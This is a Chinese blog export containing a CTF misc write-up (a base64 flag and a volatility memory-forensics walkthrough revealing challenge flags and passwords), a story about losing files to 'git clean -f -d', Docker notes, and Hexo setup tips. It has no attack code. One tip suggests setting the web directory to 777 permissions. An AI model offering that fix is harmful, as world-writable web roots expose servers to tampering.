<p>得到一串数字：<code>187485618521</code>，base64加密一下得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MTg3NDg1NjE4NTIx</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h4><p>流量分析+内存取证+usb(键盘)</p>
<p>这道题在比赛的时候没做出来（当时还没咋做过内存取证），看<a href="https://blog.xiafeng2333.top/" target="_blank" rel="noopener">夏风师傅的博客</a>又复盘了一遍</p>
<p>在pacp提取出一个压缩包里面有data.vmem（或者binwalk，foremost啥的</p>
<p>扔进kali里，先识别一下操作系统</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem imageinfo</span><br></pre></td></tr></table></figure></div>

<p>发现是32位的winxp，列一下进程(pslist无法显示隐藏/终止进程，可以用插件psscan解决</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/09/xctf-misc-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>当时关键进程抓错了。。没分析IE（一生之敌）。。直接去提取cmd和conime的进程，然后去扫flag字符串</p>
<p>陷进去的时候，那道题已经被解出来了，然后就不想做了。。（小白还是小白。。</p>
<p>关键进程应该是explorer.exe和cmd.exe</p>
<p>先去提取内存中保留的 cmd 命令使用情况</p>
<a href="/2020/03/09/xctf-misc-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现passwd：<code>weak_auth_top100</code></p>
<p>然后用iehistory查看ie浏览器使用情况发现没有信息，于是用editbox查看输入框信息</p>
<a href="/2020/03/09/xctf-misc-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现ie访问的地址是 “C:\Documents and Settings\Administrator”</p>
<p>于是用filescan搜索文件，grep过滤包含<code>Administrator</code>的地址</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep <span class="string">"Administrator"</span></span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/09/xctf-misc-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现flag.img，提取出来</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -n --dump-dir=./</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/09/xctf-misc-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>其实当时我也过滤了好多。。但是过滤的都是zip、rar、png、jpg、txt、pacp啥的。。没想过img文件（其实过滤flag也行</p>
<p>得到文件file.None.0xff425090.dat，修改后缀为img，把里面的东西提取一下</p>
<a href="/2020/03/09/xctf-misc-wp/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到一个加密的压缩包，密码就是<code>weak_auth_top100</code>（我还以为是弱口令爆破，试了两组后就放弃了</p>
<p>解压得到usbdata.txt ，网上有脚本可以分析，贴个<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">网址</a>，大佬分析的挺全面的</p>
<p>脚本跑完后得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;69200835784ec3ed8d2a64e73fe913c0&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h4><p>能力不够，这个是真不会（挺正能量一题，哈哈哈哈哈</p>
<p>提取到flag.exe就不会了，IDA分析不会。。运行的时候倒是发现六个输入接回车后会输出一些无规则字符。。</p>
<p>赛后讨论的时候才知道加了个VMP壳？。。</p>
<p>然后群里的师傅发现了这个</p>
<a href="/2020/03/09/xctf-misc-wp/15.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>

<p>还有这个</p>
<a href="/2020/03/09/xctf-misc-wp/15.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>misc新题型解锁：开心猜猜猜！</p>
<p>最后我：</p>
<a href="/2020/03/09/xctf-misc-wp/16.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>二更：官方wp</p>
<a href="/2020/03/09/xctf-misc-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>其中用steghide爆破的密码为：ctf</p>
<p>u1s1，还不如去猜flag……..</p>
<p>&nbsp;</p>
<p>希望下次misc能多做出来几道，嘿嘿嘿！</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>xctf</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次自闭经历</title>
    <url>/2020/03/07/A-painful-experience/</url>
    <content><![CDATA[<p>记昨晚我的一次惨痛经历</p>
<h4 id="事件经过"><a href="#事件经过" class="headerlink" title="事件经过"></a>事件经过</h4><p>因为我是在服务器和Github上同时更新博客的，所以在昨天配置完善好新加的主题后</p>
<p>先deploy到了Gitpage上，可以、不错很成功，然后就是往服务器上放了</p>
<p>嗯，hexo clean g d一气呵成。。。访问网站。。。</p>
<p>？？？？？？？？？</p>
<p>此时问题出现了，网站内容没更新！！！</p>
<p>再刷新几次试试。。。还是没有！！！！</p>
<p>回来再部署一次！一定是姿势不对！</p>
<a href="/2020/03/07/A-painful-experience/5.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>淦！！为啥还是没有，研究一下hexo d之后的内容。。</p>
<p>“Branch ‘master’ set up to track remote branch ‘master’ from”？？？？？？</p>
<p>百度一下，奥！！原来是分叉了，操作一番。。。。</p>
<p>在一窍不通的情况下试验了status、commit、merge、branch、add、push、checkout、push………</p>
<p>嘿！还是不行？？这时一段代码来了！！</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>

<p>就是它！！就是它！！它摧毁了我的hexo，它删掉了我辛辛苦苦配置了很久的next和butterfly</p>
<a href="/2020/03/07/A-painful-experience/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>第一反应woc！！！赶紧去回收站看看，有救没？？有救没？？？</p>
<p>没有了！！！5555草5555！！！</p>
<p>于是悲伤地卸掉hexo打算重新来过</p>
<a href="/2020/03/07/A-painful-experience/3.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>但是再下下来后，发现hexo s连TM自己本地的4000端口都看不来了！！（急了急了脑子没了</p>
<p>那时候已经一点多了，我悲伤地发出了一篇纪念我短暂博客生涯的说说</p>
<p>那时已经在看Ghost怎么搭建了（但是说真的还是放不下hexo，作业那么多，也没有重头再来的勇气了</p>
<p>这时一位学姐的评论，又让我看到blog转生的希望</p>
<a href="/2020/03/07/A-painful-experience/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>DiskGenius文件数据恢复工具，然后就去扫我的磁盘</p>
<p>但是有用的只找到了一部分，很多都丢了（像styl文件、yml文件</p>
<p>比较惊喜的还是把自己之前发博客写的md文件找到了（很重要，没这个我贼难受，懒得copy了</p>
<p>这时时间来到了3点多钟，我不甘心的睡下了，仿佛看开了，其实脑子里全都是</p>
<p>“Branch ‘master’ set up to track remote branch ‘master’ from”。。。。。。。。。</p>
<a href="/2020/03/07/A-painful-experience/6.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>时间来到了今天，早上爬起来水了道战疫的misc后。。</p>
<p>淦！我不甘心！爷要从头开始！！！（md，要不是这事，我OS实验一应该写的差不多了</p>
<p>经过一下午的复原。。。。我努力把它变成了原来的样子。。。。</p>
<p>hexo clean g d。。！！？？还是之前的样子？？？？</p>
<p>这次又去研究了下分叉，切到.deploy<code>git branch -a</code>。。。就一个master呀</p>
<p><code>ssh -v git@xx.xx.xx.xx</code>在服务器里切到blog.git。。。就一个master呀</p>
<a href="/2020/03/07/A-painful-experience/7.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>WinSCP连上服务器，看一下文件更新时间？？是今天下午啊！没错呀！</p>
<p>此时的我意识到了问题的不对劲</p>
<a href="/2020/03/07/A-painful-experience/8.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>每次在Edge进博客进得都很快，我知道可能是有缓存之类的，但是清除缓存后好像没并没有什么卵用</p>
<p>于是我打算换一个浏览器进入一下我的博客（  Firefox启动，Google启动</p>
<p>进入博客。。无法访问？？？？？？？？</p>
<p>换一个子域名，进去了！更新了！！？？</p>
<p>我突然想到了我昨天下午搞的骚东西——CDN，好像没搞完就放那不管了</p>
<p>接下来我发现我的域名解析暂停了没开，CDN暂停了没删</p>
<p>真相只有一个</p>
<a href="/2020/03/07/A-painful-experience/9.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>Edge是个 随便！！（好吧，其实是我菜，但是edge浏这个览器连我域名没开解析都能进去的机制属实恶心</p>
<p>还有就是为啥我拿dl进去是更新的状态，自己的ip却不更新的（我咋觉得还跟上次扫目录有关。。</p>
<p>&nbsp;</p>
<p>以后一定要提前备份！！</p>
<p>还有在这插个眼，以后再在git上犯重大错误就T回来扇自己</p>
<p><a href="https://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">Git 菜鸟教程</a></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>cdn</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装(learning)</title>
    <url>/2020/03/02/Docker-learning/</url>
    <content><![CDATA[<p>三战Centos 转win10，然而跟虚拟机冲突，再回去呗</p>
<p>还有因为项目要用到，面对现实就完了</p>
<a id="more"></a>

<hr>
<h5 id="事件记录"><a href="#事件记录" class="headerlink" title="事件记录"></a>事件记录</h5><p>curl太慢（卡着卡着停了）、python2退休（确实不方便）、pip安装不成功</p>
<p>权限赋予 chmod、教程没啥说的下面挺全</p>
<p>学习过程再更，（众所周知，安装≈学会）</p>
<p><a href="/2020/03/02/Docker-learning/t.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload"></a></p>
<h5 id="相关网址："><a href="#相关网址：" class="headerlink" title="相关网址："></a>相关网址：</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Docker入门</a></p>
<p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10中docker的安装与使用</a></p>
<p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7安装Docker Compose(pip方式安装)</a></p>
<h5 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h5><p>虽然自己的博客也没啥跟外界的密码资料传输，但还是换了个https，安全就完事了，<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">教程</a></p>
<p>不要扫自己的ali服务器，会封一段时间ip</p>
<p>一个新公测的CTF网站  <a href="https://www.ctfhub.com/" target="_blank" rel="noopener">ctfhub</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-misc-wp</title>
    <url>/2020/03/01/buuctf-misc-wp/</url>
    <content><![CDATA[<p>这篇blog来记录在BUUCTF上做的一些有趣的misc题。（部分wp，持续更新ing）</p>
<p>学啥web，misc不好玩了吗？</p>
<a id="more"></a>

<p>不着急，有时间就写</p>
<p>太多了，先咕着</p>
]]></content>
      <categories>
        <category>Write_up</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2020/02/15/My-first/</url>
    <content><![CDATA[<p>此篇纪念一下BTIS博客的成功搭建。<!--肯定不是因为我太菜，无fk写--></p>
<p>Completed？&emsp; No，This is just the beginning！</p>
<a id="more"></a>

<hr>
<p>这里讲讲我搭建地时候遇到的问题吧：</p>
<h3 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h3><p>本来选的是Miccall，发现网上这种组件添加和拓展的教程有点少，最后还是选择了<del>最大众的Next主题</del>butterfly（二更。<del>（功能那么多、教程那么多，它不香吗？</del>（插件插得再多还是有、丑，便捷无法战胜我的审美……butterfly真香</p>
<h3 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure></div>

<p>换成淘宝的源会好很多</p>
<h3 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h3><p>如果想自定义一些自己的样式，而你的版本恰是Next7.X的话（目前最新的Next）。你会发现很多文章中提及的custom文件（可以自由编辑样式的一个文件）没有了。这时你可以在根目录下的source文件下面新建一个_data文件夹，然后在里面新建建一个styles.styl，并在主题配置里设置一下（如下图），这样你就可以在里面加一些自定义的代码了。</p>
<a href="/2020/02/15/My-first/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>



<h3 id="注意用户切换"><a href="#注意用户切换" class="headerlink" title="注意用户切换"></a>注意用户切换</h3><p>在往服务器部署时注意git用户和root用户的切换，<a href="https://blog.csdn.net/baiyuwujia/article/details/80648554?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">注意一下git的默认目录</a>。还有就是公钥传递，如果之前传递过，记得删除本地电脑.ssh里面的known_hosts文件。（也许只有我这种不懂Linux的小白会踩这种坑吧）</p>
<h3 id="Linux用户删除"><a href="#Linux用户删除" class="headerlink" title="Linux用户删除"></a>Linux用户删除</h3><p>如果和我一样在Linux里一气之下误删git用户文件的话可以用看看<a href="https://blog.csdn.net/luxiaosi520/article/details/90483981?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">这篇博客</a>（无能狂怒）</p>
<h3 id="403解决"><a href="#403解决" class="headerlink" title="403解决"></a>403解决</h3><p>最后如果你在本地和服务端都搭好但是网页是403，而且www/website目录下没有文件的话可以试着吧www/website的权限转让给git，或者直接777公开，然后再在本地进行hexo d操作，就可以看到网页了。</p>
<h3 id="搭建教程"><a href="#搭建教程" class="headerlink" title="搭建教程"></a>搭建教程</h3><p>1.<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029" target="_blank" rel="noopener">搭Github page</a></p>
<p>2.<a href="https://blog.csdn.net/NoCortY/article/details/99631249?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">搭服务器端</a></p>
<p>3.<a href="https://www.jianshu.com/p/f054333ac9e6" target="_blank" rel="noopener">Next比较全的美化教程</a></p>
<p>4.<a href="https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B" target="_blank" rel="noopener">Butterfly美化</a></p>
<!--服务器太脆经不起黑，俺不会维护，还望各位手下留情-->]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
